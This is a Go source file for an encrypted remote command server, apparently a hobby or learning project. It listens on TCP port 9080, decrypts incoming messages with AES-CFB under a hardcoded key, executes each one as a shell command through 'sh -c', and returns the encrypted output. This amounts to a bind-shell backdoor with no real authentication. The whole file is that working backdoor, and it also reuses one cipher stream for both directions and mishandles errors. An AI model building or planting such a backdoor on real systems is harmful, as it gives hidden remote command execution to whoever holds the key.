package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"net"
	"os/exec"
	"io"
)

func commands(command []byte) string{
	out, err := exec.Command("sh", "-c",string(command)).Output()

	if err != nil {
		fmt.Println(err)
		return "there is error in your command !"
	}
	output := string(out[:])
	return output
}

func handleConnServer(key []byte,conn net.Conn){
	block, blockErr := aes.NewCipher(key)

	if blockErr != nil {
		fmt.Println("Error creating cipher:", blockErr)

		return
	}

	iv := make([]byte, 16)

	ivReadLen, ivReadErr := conn.Read(iv)

	if ivReadErr != nil {
		fmt.Errorf("Can't read IV:", ivReadErr)

		return
	}

	iv = iv[:ivReadLen]

	if len(iv) < aes.BlockSize {
		fmt.Println("Invalid IV length:", len(iv))

		return
	}

	stream := cipher.NewCFBDecrypter(block, iv)
	fmt.Println("Hello", conn.RemoteAddr())
	buf := make([]byte, 4096)//the buffer size here to send the response to the client is 4kb

	for {
		rLen, rErr := conn.Read(buf)

		if rErr == nil {
			stream.XORKeyStream(buf[:rLen], buf[:rLen])

			//from here starts the commanding
			response := commands(buf[:rLen])

			rpbuffer := []byte(response)

			encrypted := make([]byte, len(rpbuffer))

			decrypted := rpbuffer

			stream.XORKeyStream(encrypted, decrypted)


			conn.Write(encrypted)
			continue
		}

		if rErr == io.EOF {
			stream.XORKeyStream(buf[:rLen], buf[:rLen])

			fmt.Println("Data:", string(buf[:rLen]), rLen, "EOF -")

			break
		}

		fmt.Errorf(
			"Error while reading from",
			conn.RemoteAddr(),
			":",
			rErr,
		)
		break
	}

	fmt.Println("Started Listening")
}

func main() {
	ln, err := net.Listen("tcp", ":9080")

	if err != nil {
		panic(err)
	}

	//this is the encryption key , it should be the same for both client and server !
	key := []byte("example key 1234")

	fmt.Println("Started Listening")

	if err != nil {
		panic(err)
	}

	for {
		conn, err := ln.Accept()

		if err != nil {
			fmt.Errorf(
				"Error while handling request from",
				conn.RemoteAddr(),
				":",
				err,
			)
		}

		//here is the handling function !
		go handleConnServer(key, conn)

	}
}
